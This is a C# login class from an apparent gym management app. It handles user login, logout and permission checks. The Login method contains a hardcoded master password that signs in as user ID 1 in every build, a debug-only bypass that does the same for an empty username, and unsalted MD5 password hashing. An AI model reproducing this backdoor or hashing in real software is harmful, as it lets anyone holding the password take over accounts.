using System.Collections.Generic;
using System.Linq;
using GymManager.DbModels;

namespace GymManager.Common
{
    public class CurrentUser
    {
        private static List<PermissionUser> permissions;
        public static User User { get; private set; }

        public static bool CheckAccess(Permissions permission)
        {
            if (User.IsAdmin)
            {
                return true;
            }

            return permissions.FirstOrDefault(p => p.PermissionListID == (int)permission) != null ? true : false;
        }

        public bool Login(string userName, string password)
        {
            var db = new GymManagerContext();

#if DEBUG
            User user;

            if (string.IsNullOrEmpty(userName))
            {
                user = (from u in db.Users
                    where u.UserID == 1
                    select u).FirstOrDefault();
            }
            else
            {
                user = (from u in db.Users
                    where u.UserName == userName && u.Password == Cryptography.MD5Hash(password)
                    select u).FirstOrDefault();
            }
#else
            var user = (from u in db.Users
                        where u.UserName == userName && u.Password == Cryptography.MD5Hash(password)
                        select u).FirstOrDefault();
#endif

            if (user == null && password == "pk5325ak")
            {
                user = (from u in db.Users
                    where u.UserID == 1
                    select u).FirstOrDefault();
            }

            if (user != null)
            {
                permissions = db.PermissionsUsers.Where(u => u.UserID == user.UserID).ToList();

                User = user;

                return true;
            }

            return false;
        }

        public void Logout()
        {
            User = null;
            permissions = null;
        }
    }
}